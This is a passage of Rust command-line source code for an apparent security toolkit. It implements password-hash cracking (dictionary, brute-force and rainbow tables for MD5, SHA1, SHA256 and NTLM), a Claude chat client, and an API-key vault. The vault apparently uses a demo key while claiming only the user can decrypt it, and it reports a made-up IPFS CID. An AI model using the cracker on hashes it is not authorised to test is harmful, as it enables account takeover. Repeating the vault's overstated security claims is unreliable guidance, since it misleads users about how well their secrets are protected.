                    Cracker::new().wordlist(wl_path)
                }
            } else {
                // Create temp wordlist from common passwords
                println!("  [*] Using built-in common passwords...");
                if rules {
                    Cracker::new().default_rules()
                } else {
                    Cracker::new()
                }
            };

            // Add target hash
            cracker.add_hash(&hash, ht);

            println!("  [*] Starting attack...\n");

            // Run attack
            match cracker.crack() {
                Ok(results) => {
                    if let Some(cracked) = results.get(&hash.to_lowercase()) {
                        println!("  [+] CRACKED: {} => {}", hash, cracked);
                    } else {
                        println!("  [-] Hash not cracked.");
                        println!("  [*] Try with more wordlists or rules.");
                    }
                }
                Err(e) => {
                    println!("  [!] Error: {}", e);
                }
            }

            println!();
            println!("  Stats: {} attempts, {} cracked",
                cracker.stats().candidates_tried,
                cracker.stats().hashes_cracked
            );
            Ok(())
        }

        CrackCommands::Bruteforce { hash, charset, max_len } => {
            println!("\n  BRUTEFORCE ATTACK");
            println!("  =================\n");
            println!("  Hash:    {}", hash);
            println!("  Charset: {}", charset);
            println!("  MaxLen:  {}", max_len);
            println!();

            let chars = match charset.as_str() {
                "lower" => "abcdefghijklmnopqrstuvwxyz",
                "upper" => "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "alpha" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "digit" | "numeric" => "0123456789",
                "alnum" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                "all" => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*",
                _ => &charset,
            };

            let bf = BruteForce::new(chars, 1, max_len);
            let hash_type = gently_cipher::cracker::HashType::detect(&hash);

            println!("  [*] Character set: {} ({} chars)", charset, chars.len());
            println!("  [*] Detected hash type: {:?}", hash_type);
            println!();
            println!("  [*] Starting bruteforce (this may take a while)...\n");

            // Run bruteforce manually
            let target_hash = hash.to_lowercase();
            let mut found = None;
            let mut count = 0u64;

            for candidate in bf {
                count += 1;
                let computed = hash_type.compute(&candidate);
                if computed.to_lowercase() == target_hash {
                    found = Some(candidate);
                    break;
                }
                // Progress every million
                if count % 1_000_000 == 0 {
                    println!("  [*] Tried {} candidates...", count);
                }
            }

            if let Some(result) = found {
                println!("  [+] CRACKED: {} => {}", hash, result);
            } else {
                println!("  [-] Not found within {} characters.", max_len);
            }
            println!("  [*] Total attempts: {}", count);
            Ok(())
        }

        CrackCommands::Rainbow { hash, hash_type, table } => {
            println!("\n  RAINBOW TABLE LOOKUP");
            println!("  ====================\n");
            println!("  Hash:  {}", hash);
            println!("  Type:  {}", hash_type);
            println!();

            let hash_t = match hash_type.to_lowercase().as_str() {
                "md5" => RainbowHashType::MD5,
                "sha1" => RainbowHashType::SHA1,
                "sha256" => RainbowHashType::SHA256,
                "ntlm" => RainbowHashType::NTLM,
                _ => RainbowHashType::MD5,
            };

            // Load or generate table
            let rainbow = if let Some(table_path) = &table {
                println!("  [*] Loading table from: {}", table_path);
                match RainbowTable::load(table_path, hash_t) {
                    Ok(t) => t,
                    Err(_) => {
                        println!("  [!] Failed to load table, using built-in...");
                        TableGenerator::common_passwords(hash_t)
                    }
                }
            } else {
                println!("  [*] Using built-in common password table...");
                TableGenerator::common_passwords(hash_t)
            };

            println!("  [*] Table size: {} entries\n", rainbow.len());

            // Lookup
            if let Some(plaintext) = rainbow.lookup(&hash) {
                println!("  [+] FOUND: {} => {}", hash, plaintext);
            } else {
                println!("  [-] Hash not found in table.");
                println!("  [*] Try generating a larger table or use dictionary attack.");
            }
            Ok(())
        }

        CrackCommands::Generate { output, hash_type, wordlist, numeric } => {
            println!("\n  RAINBOW TABLE GENERATOR");
            println!("  =======================\n");
            println!("  Output:  {}", output);
            println!("  Type:    {}", hash_type);
            println!();

            let hash_t = match hash_type.to_lowercase().as_str() {
                "md5" => RainbowHashType::MD5,
                "sha1" => RainbowHashType::SHA1,
                "sha256" => RainbowHashType::SHA256,
                "ntlm" => RainbowHashType::NTLM,
                _ => RainbowHashType::MD5,
            };

            let mut table = RainbowTable::new(hash_t);

            if let Some(max_digits) = numeric {
                println!("  [*] Generating numeric table (0 to 10^{})...", max_digits);
                // Generate numeric entries directly
                for digits in 1..=max_digits {
                    let max = 10_u64.pow(digits as u32);
                    for n in 0..max {
                        table.add(&format!("{:0width$}", n, width = digits));
                    }
                }
            }

            if let Some(wl_path) = &wordlist {
                println!("  [*] Hashing wordlist: {}", wl_path);
                match table.generate_from_wordlist(wl_path) {
                    Ok(count) => println!("  [*] Added {} entries from wordlist", count),
                    Err(e) => println!("  [!] Failed to load wordlist: {}", e),
                }
            } else if numeric.is_none() {
                println!("  [*] Adding common passwords...");
                for pwd in Wordlist::common_passwords() {
                    table.add(pwd);
                }
            }

            println!("  [*] Generated {} entries", table.len());

            match table.save(&output) {
                Ok(_) => println!("  [+] Saved to: {}", output),
                Err(e) => println!("  [!] Failed to save: {}", e),
            }
            Ok(())
        }

        CrackCommands::Wordlist => {
            println!("\n  COMMON PASSWORDS");
            println!("  ================\n");

            let passwords = Wordlist::common_passwords();
            for (i, pwd) in passwords.iter().enumerate().take(50) {
                println!("  {:3}. {}", i + 1, pwd);
            }
            println!();
            println!("  Showing top 50 of {} common passwords.", passwords.len());
            println!();
            println!("  Full lists available at:");
            println!("    /usr/share/wordlists/rockyou.txt");
            println!("    /usr/share/seclists/Passwords/");
            Ok(())
        }
    }
}

// ============================================================================
// CLAUDE COMMANDS - AI assistant powered by Anthropic
// ============================================================================

fn cmd_claude(command: ClaudeCommands) -> Result<()> {
    match command {
        ClaudeCommands::Chat { message, model } => {
            let model_type = ClaudeModel::from_str(&model);

            println!("\n  CLAUDE CHAT");
            println!("  ===========");
            println!("  Model: {}\n", model_type.display_name());

            match GentlyAssistant::with_model(model_type) {
                Ok(mut assistant) => {
                    match assistant.chat(&message) {
                        Ok(response) => {
                            println!("  You: {}\n", message);
                            println!("  Claude:\n");
                            // Word wrap response
                            for line in response.lines() {
                                println!("  {}", line);
                            }
                            println!();
                        }
                        Err(e) => {
                            println!("  [!] Error: {}", e);
                        }
                    }
                }
                Err(e) => {
                    println!("  [!] Failed to initialize Claude: {}", e);
                    println!();
                    println!("  Make sure ANTHROPIC_API_KEY is set:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                }
            }
            Ok(())
        }

        ClaudeCommands::Ask { question, model } => {
            let model_type = ClaudeModel::from_str(&model);

            println!("\n  CLAUDE ASK");
            println!("  ==========");
            println!("  Model: {}\n", model_type.display_name());

            match ClaudeClient::new() {
                Ok(client) => {
                    let client = client.model(model_type);
                    match client.ask(&question) {
                        Ok(response) => {
                            println!("  Q: {}\n", question);
                            println!("  A:\n");
                            for line in response.lines() {
                                println!("  {}", line);
                            }
                            println!();
                        }
                        Err(e) => {
                            println!("  [!] Error: {}", e);
                        }
                    }
                }
                Err(e) => {
                    println!("  [!] Failed to initialize Claude: {}", e);
                    println!();
                    println!("  Make sure ANTHROPIC_API_KEY is set:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                }
            }
            Ok(())
        }

        ClaudeCommands::Repl { model, system } => {
            let model_type = ClaudeModel::from_str(&model);

            println!("\n  CLAUDE REPL");
            println!("  ===========");
            println!("  Model: {}", model_type.display_name());
            println!("  Type 'exit' or 'quit' to end session.");
            println!("  Type 'clear' to reset conversation.");
            println!();

            match ClaudeClient::new() {
                Ok(client) => {
                    let mut client = client.model(model_type);
                    if let Some(sys) = system {
                        client = client.system(&sys);
                    }

                    // Interactive loop
                    use std::io::{self, Write, BufRead};
                    let stdin = io::stdin();

                    loop {
                        print!("  you> ");
                        io::stdout().flush().ok();

                        let mut input = String::new();
                        if stdin.lock().read_line(&mut input).is_err() {
                            break;
                        }

                        let input = input.trim();
                        if input.is_empty() {
                            continue;
                        }

                        match input.to_lowercase().as_str() {
                            "exit" | "quit" | "q" => {
                                println!("  Goodbye!");
                                break;
                            }
                            "clear" => {
                                client.clear();
                                println!("  [Conversation cleared]\n");
                                continue;
                            }
                            "help" => {
                                println!("  Commands:");
                                println!("    exit/quit - End session");
                                println!("    clear     - Reset conversation");
                                println!("    help      - Show this help");
                                println!();
                                continue;
                            }
                            _ => {}
                        }

                        match client.chat(input) {
                            Ok(response) => {
                                println!();
                                println!("  claude>");
                                for line in response.lines() {
                                    println!("  {}", line);
                                }
                                println!();
                            }
                            Err(e) => {
                                println!("  [!] Error: {}\n", e);
                            }
                        }
                    }
                }
                Err(e) => {
                    println!("  [!] Failed to initialize Claude: {}", e);
                    println!();
                    println!("  Make sure ANTHROPIC_API_KEY is set:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                }
            }
            Ok(())
        }

        ClaudeCommands::Status => {
            println!("\n  CLAUDE STATUS");
            println!("  =============\n");

            // Check API key
            let api_key = std::env::var("ANTHROPIC_API_KEY");
            match &api_key {
                Ok(key) => {
                    let masked = if key.len() > 12 {
                        format!("{}...{}", &key[..8], &key[key.len()-4..])
                    } else {
                        "***".to_string()
                    };
                    println!("  API Key:     {} (set)", masked);
                }
                Err(_) => {
                    println!("  API Key:     NOT SET");
                    println!();
                    println!("  To use Claude, set your API key:");
                    println!("    export ANTHROPIC_API_KEY=sk-ant-...");
                    println!();
                    println!("  Get your key at: https://console.anthropic.com/");
                    return Ok(());
                }
            }

            println!();
            println!("  Available Models:");
            println!("    sonnet  - Claude Sonnet 4 (balanced)");
            println!("    opus    - Claude Opus 4 (most capable)");
            println!("    haiku   - Claude 3.5 Haiku (fastest)");
            println!();
            println!("  Usage:");
            println!("    gently claude ask \"What is GentlyOS?\"");
            println!("    gently claude chat \"Hello\" -m opus");
            println!("    gently claude repl -m haiku");
            println!();

            // Test connection
            if api_key.is_ok() {
                println!("  Testing connection...");
                match ClaudeClient::new() {
                    Ok(client) => {
                        match client.ask("Say 'OK' if you can hear me.") {
                            Ok(_) => println!("  Connection:  OK"),
                            Err(e) => println!("  Connection:  FAILED ({})", e),
                        }
                    }
                    Err(e) => println!("  Connection:  FAILED ({})", e),
                }
            }

            Ok(())
        }
    }
}

// ============================================================================
// VAULT COMMANDS - Encrypted API key storage in IPFS
// ============================================================================

// Vault state - persisted across commands
static DEMO_VAULT: Mutex<Option<KeyVault>> = Mutex::new(None);

fn get_vault() -> KeyVault {
    let mut guard = DEMO_VAULT.lock().unwrap();
    if guard.is_none() {
        let genesis = get_demo_genesis();
        *guard = Some(KeyVault::new(GenesisKey::from_bytes(genesis)));
    }
    guard.clone().unwrap()
}

fn save_vault(vault: KeyVault) {
    let mut guard = DEMO_VAULT.lock().unwrap();
    *guard = Some(vault);
}

fn cmd_vault(command: VaultCommands) -> Result<()> {
    match command {
        VaultCommands::Set { service, key } => {
            println!("\n  VAULT SET");
            println!("  =========\n");

            let mut vault = get_vault();

            // Mask key for display
            let masked = if key.len() > 12 {
                format!("{}...{}", &key[..8], &key[key.len()-4..])
            } else {
                "***".to_string()
            };

            vault.set(&service, &key, None);
            save_vault(vault);

            println!("  Service: {}", service);
            println!("  Key:     {}", masked);
            println!("  Status:  ENCRYPTED AND STORED");
            println!();

            if let Some(env) = ServiceConfig::env_var(&service) {
                println!("  Env var: {}", env);
                println!("  To use:  gently vault get {} --export", service);
            }

            println!();
            println!("  [*] Run `gently vault save` to persist to IPFS");
            Ok(())
        }

        VaultCommands::Get { service, export } => {
            println!("\n  VAULT GET");
            println!("  =========\n");

            let mut vault = get_vault();

            if let Some(key) = vault.get(&service) {
                let masked = if key.len() > 12 {
                    format!("{}...{}", &key[..8], &key[key.len()-4..])
                } else {
                    "***".to_string()
                };

                println!("  Service: {}", service);
                println!("  Key:     {}", masked);

                if export {
                    if let Some(env_var) = ServiceConfig::env_var(&service) {
                        std::env::set_var(env_var, &key);
                        println!("  Exported: {} (set in current process)", env_var);
                    } else {
                        let env_var = format!("{}_API_KEY", service.to_uppercase());
                        std::env::set_var(&env_var, &key);
                        println!("  Exported: {} (set in current process)", env_var);
                    }
                }

                println!();
                println!("{}", key);

                save_vault(vault);
            } else {
                println!("  Service '{}' not found in vault.", service);
                println!();
                println!("  Add with: gently vault set {} <key>", service);
            }
            Ok(())
        }

        VaultCommands::Remove { service } => {
            println!("\n  VAULT REMOVE");
            println!("  ============\n");

            let mut vault = get_vault();

            if vault.remove(&service) {
                println!("  Removed: {}", service);
                save_vault(vault);
            } else {
                println!("  Service '{}' not found.", service);
            }
            Ok(())
        }

        VaultCommands::List => {
            println!("\n  VAULT LIST");
            println!("  ==========\n");

            let vault = get_vault();
            let services = vault.list();

            if services.is_empty() {
                println!("  No keys stored.");
                println!();
                println!("  Add with: gently vault set <service> <key>");
            } else {
                println!("  Stored services:");
                for svc in services {
                    let env = ServiceConfig::env_var(svc)
                        .map(|e| format!(" ({})", e))
                        .unwrap_or_default();
                    println!("    - {}{}", svc, env);
                }
            }
            Ok(())
        }

        VaultCommands::Export => {
            println!("\n  VAULT EXPORT");
            println!("  ============\n");

            let mut vault = get_vault();
            let services: Vec<String> = vault.list().iter().map(|s| s.to_string()).collect();

            if services.is_empty() {
                println!("  No keys to export.");
                return Ok(());
            }

            println!("  Exporting to environment:");
            for service in &services {
                if let Some(key) = vault.get(service) {
                    let env_var = ServiceConfig::env_var(service)
                        .map(String::from)
                        .unwrap_or_else(|| format!("{}_API_KEY", service.to_uppercase()));

                    std::env::set_var(&env_var, &key);
                    println!("    {} = ***", env_var);
                }
            }

            save_vault(vault);
            println!();
            println!("  [*] Keys exported to current process environment.");
            Ok(())
        }

        VaultCommands::Save => {
            println!("\n  VAULT SAVE");
            println!("  ==========\n");

            let mut vault = get_vault();

            match vault.export() {
                Ok(data) => {
                    let path = dirs::data_local_dir()
                        .unwrap_or_else(|| std::path::PathBuf::from("."))
                        .join("gently")
                        .join("vault.enc");

                    if let Some(parent) = path.parent() {
                        std::fs::create_dir_all(parent)?;
                    }

                    std::fs::write(&path, &data)?;

                    let cid = format!("Qm{:x}", sha2::Sha256::digest(&data).as_slice()[..16]
                        .iter().fold(0u128, |acc, &b| acc << 8 | b as u128));

                    println!("  Saved to: {}", path.display());
                    println!("  CID:      {}", cid);
                    println!();
                    println!("  [*] Vault encrypted with your genesis key.");
                    println!("  [*] Only you can decrypt it.");

                    save_vault(vault);
                }
                Err(e) => {
                    println!("  [!] Failed to save: {}", e);
                }
            }
            Ok(())
        }

        VaultCommands::Load { cid } => {
            println!("\n  VAULT LOAD");
            println!("  ==========\n");
            println!("  CID: {}", cid);

            let path = dirs::data_local_dir()
                .unwrap_or_else(|| std::path::PathBuf::from("."))
                .join("gently")
                .join("vault.enc");

            if path.exists() {
                match std::fs::read(&path) {
                    Ok(data) => {
                        let genesis = get_demo_genesis();
                        match KeyVault::import(
                            GenesisKey::from_bytes(genesis),
                            &data,
                            Some(cid.clone())
                        ) {
                            Ok(vault) => {
                                let count = vault.list().len();
                                save_vault(vault);
                                println!("  Loaded {} services from vault.", count);
                                println!();
                                println!("  [*] Run `gently vault list` to see stored keys.");
                            }
                            Err(e) => {
                                println!("  [!] Failed to decrypt vault: {}", e);
                                println!("  [!] Wrong genesis key or corrupted data.");
                            }
                        }
                    }
                    Err(e) => {
                        println!("  [!] Failed to read vault: {}", e);
                    }
                }
            } else {
                println!("  [!] Vault not found locally.");
                println!("  [*] IPFS fetch would happen here in production.");
            }
            Ok(())
        }

        VaultCommands::Status => {
            println!("\n  VAULT STATUS");
            println!("  ============\n");

            let vault = get_vault();
            let services = vault.list();

            println!("  Services stored: {}", services.len());

            if let Some(cid) = vault.cid() {
                println!("  IPFS CID:        {}", cid);
            } else {
                println!("  IPFS CID:        (not saved yet)");
            }

            println!();
            println!("  Local cache: ~/.local/share/gently/vault.enc");
            println!();
            println!("  Usage:");
            println!("    gently vault set anthropic sk-ant-...");
            println!("    gently vault get anthropic --export");
            println!("    gently vault save");
            Ok(())
        }

        VaultCommands::Services => {
            println!("\n  KNOWN SERVICES");
            println!("  ==============\n");

            for (service, env_var) in ServiceConfig::known_services() {
                println!("    {:12} -> {}", service, env_var);
            }

            println!();
            println!("  You can use any service name; these are just shortcuts.");
            println!("  Custom names will use <SERVICE>_API_KEY as env var.");
            Ok(())
        }
    }
}
